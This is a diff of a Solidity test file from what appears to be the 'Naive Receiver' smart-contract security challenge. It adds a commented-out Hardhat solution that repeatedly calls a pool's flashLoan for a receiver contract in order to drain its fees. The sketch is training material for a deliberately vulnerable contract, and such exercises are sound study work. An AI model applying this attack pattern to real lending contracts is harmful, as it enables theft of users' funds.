@@ -77,7 +77,12 @@ contract NaiveReceiverChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_naiveReceiver() public checkSolvedByPlayer {
-        
+        // @audit-info hardhat solution
+        // 10 transactions
+        // const ETH = await pool.ETH();
+        // for(let i = 0; i < 10; i++){
+        //     await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
+        // 
     }
 
     /**
